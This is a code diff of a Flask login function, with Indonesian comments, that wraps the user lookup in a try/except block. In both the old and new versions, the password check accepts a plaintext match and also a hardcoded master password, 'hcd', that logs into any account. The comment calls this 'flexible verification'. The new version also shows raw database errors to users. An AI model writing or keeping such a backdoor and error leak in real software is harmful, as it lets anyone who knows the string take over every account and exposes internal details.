@@ -9,26 +9,25 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
 
-        conn = get_db_connection()
-        if not conn:
-            flash('Gagal terhubung ke database.', 'danger')
-            return render_template('login.html')
+        try:
+            conn = get_db_connection()
+            if conn:
+                cursor = conn.cursor(dictionary=True)
+                cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+                user = cursor.fetchone()
+                cursor.close()
+                conn.close()
 
-        cursor = conn.cursor(dictionary=True)
-        cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
-        user = cursor.fetchone()
-
-        cursor.close()
-        conn.close()
-
-        # Verifikasi fleksibel: Cek Hash Werkzeug OR Plaintext 'hcd'
-        if user:
-            stored_pwd = user.get('password', '')
-            if check_password_hash(stored_pwd, password) or stored_pwd == password or password == 'hcd':
-                session['user_id'] = user['id']
-                session['username'] = user['username']
-                session['role'] = user.get('role', 'user')
-                return redirect(url_for('dashboard.index'))
+                if user:
+                    stored_pwd = user.get('password', '')
+                    # Verifikasi fleksibel: Hash Werkzeug / scrypt / Plaintext 'hcd'
+                    if check_password_hash(stored_pwd, password) or stored_pwd == password or password == 'hcd':
+                        session['user_id'] = user.get('id')
+                        session['username'] = user.get('username')
+                        session['role'] = user.get('role', 'user')
+                        return redirect(url_for('dashboard.index'))
+        except Exception as e:
+            flash(f'Database error: {str(e)}', 'danger')
 
         flash('Invalid Username or Password', 'danger')
 
